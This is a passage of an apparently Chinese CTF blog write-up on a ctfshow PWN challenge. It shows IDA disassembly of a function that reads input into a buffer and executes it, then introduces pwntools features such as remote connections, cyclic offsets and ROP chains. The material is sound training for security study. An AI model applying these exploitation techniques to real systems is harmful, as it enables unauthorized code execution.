+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; __unwind {&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;CA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;84h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D0&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;__x86_get_pc_thunk_bx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D5&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;DB&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;100h&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; nbytes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E3&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; buf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; fd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EC&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_read&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F1&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F4&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0Ch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FD&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_puts&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048503&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048506&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;nop&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048512&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;leave&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;retn&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; } // starts at 80484C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;endp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;如果之前是打逆向或者强行入门PWN的话，最坐牢的我相信应该是用IDA吧，除了找明文字符串flag外，你学了汇编语言你也看不懂这是啥意思，感觉一小串源代码转换成汇编语言非常长、枯燥，其实UP主也深有体会，在系统性入门后，也初步知道IDA是怎么用的，这里我把下划线“===== S U B R O U T I N E =====”也复制进来了，按我理解这是函数分界，分隔线上方是前一个函数的结尾（通常以&lt;code&gt;retn&lt;/code&gt;指令结束，代表函数返回）过了这条线，说明汇编语言在描述的就是另外一个函数了。也就是说这上下分界线是代表囊括着一个函数，例如这ctfshow函数。&lt;/p&gt;
+&lt;p&gt;另外我想说的是汇编语言这么长是有道理的，它更像是一种“啰嗦”，它能在每一段代码运行后不断向你汇报地址变化，这种 “啰嗦” 本质上是&lt;strong&gt;对计算机底层操作的直接映射&lt;/strong&gt;，这种特性确实让它在跟踪程序运行细节、分析逻辑和排查问题时具有独特优势。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;从这里开始就要用pwntools了，这里介绍一下：&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt; 是在 Python 中使用 &lt;code&gt;pwntools&lt;/code&gt; 库的常见导入方式 。&lt;code&gt;pwntools&lt;/code&gt; 是一个功能强大的用于二进制漏洞利用（binary exploitation）的 Python 库，在 CTF（Capture The Flag，夺旗赛 ）竞赛、安全研究以及漏洞分析等领域广泛应用，以下是其具体作用：&lt;/p&gt;
+&lt;h4 id=&#34;与目标程序交互&#34;&gt;与目标程序交互
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;本地进程交互&lt;/strong&gt;：&lt;code&gt;pwntools&lt;/code&gt; 能轻松创建本地进程，模拟用户输入、获取程序输出。例如，&lt;code&gt;p = process(&#39;./vulnerable_program&#39;)&lt;/code&gt; 可以启动本地的可执行文件 &lt;code&gt;vulnerable_program&lt;/code&gt;，然后通过 &lt;code&gt;p.sendline(&#39;input data&#39;)&lt;/code&gt; 向程序发送数据，用 &lt;code&gt;p.recvuntil(&#39;prompt&#39;)&lt;/code&gt; 接收程序输出直到遇到特定字符串。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;远程服务器交互&lt;/strong&gt;：在面对远程存在漏洞的服务时，&lt;code&gt;pwntools&lt;/code&gt; 提供了便捷的方法。比如 &lt;code&gt;r = remote(&#39;target.com&#39;, 8080)&lt;/code&gt; 可以连接到 &lt;code&gt;target.com&lt;/code&gt; 服务器的 8080 端口，后续同样能发送和接收数据，方便对远程服务进行测试和漏洞利用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;二进制数据处理&#34;&gt;二进制数据处理
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;数据打包和解包&lt;/strong&gt;：在二进制程序中，经常需要处理不同字节序（大端序、小端序）的数据。&lt;code&gt;pwntools&lt;/code&gt; 提供了 &lt;code&gt;pack&lt;/code&gt; 和 &lt;code&gt;unpack&lt;/code&gt; 函数，比如 &lt;code&gt;p32(0x12345678)&lt;/code&gt; 可以将整数 &lt;code&gt;0x12345678&lt;/code&gt; 按照小端序打包成 4 字节的二进制数据；&lt;code&gt;u32(data)&lt;/code&gt; 则可以将 4 字节的二进制数据按照小端序解包为整数。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据转换&lt;/strong&gt;：它还支持各种数据格式之间的转换，如将字符串转换为字节串，或者进行十六进制与二进制数据之间的转换等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;辅助漏洞利用&#34;&gt;辅助漏洞利用
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;生成 Payload&lt;/strong&gt;：对于缓冲区溢出等漏洞，需要精心构造 Payload（攻击载荷）。&lt;code&gt;pwntools&lt;/code&gt; 提供了生成填充数据、构造 ROP（Return-Oriented Programming，返回导向编程 ）链等功能。比如 &lt;code&gt;cyclic(100)&lt;/code&gt; 可以生成一个 100 字节的循环模式字符串，用于确定缓冲区溢出的偏移量；通过 &lt;code&gt;ROP&lt;/code&gt; 模块可以方便地构建 ROP 链来绕过一些安全机制，实现代码执行。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;符号解析&lt;/strong&gt;：在分析二进制程序时，有时需要解析程序中的函数地址、变量地址等。&lt;code&gt;pwntools&lt;/code&gt; 可以与 &lt;code&gt;ELF&lt;/code&gt;（Executable and Linkable Format，可执行与可链接格式，常用于 Linux 系统中的可执行文件、共享库等 ）文件交互，获取这些符号信息，例如 &lt;code&gt;elf = ELF(&#39;./target_binary&#39;)&lt;/code&gt; 可以加载目标二进制文件，然后通过 &lt;code&gt;elf.symbols[&#39;main&#39;]&lt;/code&gt; 获取 &lt;code&gt;main&lt;/code&gt; 函数的地址。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;密码学相关辅助&#34;&gt;密码学相关辅助
+&lt;/h4&gt;&lt;p&gt;在 CTF 中，有时会涉及密码学题目，&lt;code&gt;pwntools&lt;/code&gt; 也提供了一些基础的密码学辅助功能，比如常见加密算法的简单实现、编码解码等。&lt;/p&gt;
+&lt;h4 id=&#34;多线程和异步支持&#34;&gt;多线程和异步支持
+&lt;/h4&gt;&lt;p&gt;&lt;code&gt;pwntools&lt;/code&gt; 一定程度上支持多线程和异步操作，这在同时与多个目标程序交互，或者需要在等待程序输出的同时执行其他任务时非常有用。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;所以为啥要学&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/python/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Python&lt;/a&gt;，当然能用&lt;a class=&#34;link&#34; href=&#34;https://www.doubao.com/chat/?from_logout=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;豆包&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://www.deepseek.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DeepSeek&lt;/a&gt;之类的AI帮你写代码exp，但你得先了解&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/python/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Python&lt;/a&gt;再让它写才对的，有时会出错，你得有判断力。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这里推荐使用Pycharm、Visual Studio Code；或者你可以在Kali上用终端来运行，这样你在Kali用nc连接靶机时在同一系统运行交互比较方便，当然Pycharm、Visual Studio Code也有终端功能，只不过要配PWN环境稍微麻烦而已，看你习不习惯用Linux系统吧。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h4 id=&#34;题目后续&#34;&gt;题目后续：
+&lt;/h4&gt;&lt;p&gt;讲得比较啰嗦，这里开始分析这段汇编代码（重新粘贴了一遍，和上面一样）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; Attributes: bp-based frame&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; int __cdecl ctfshow(_DWORD)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;
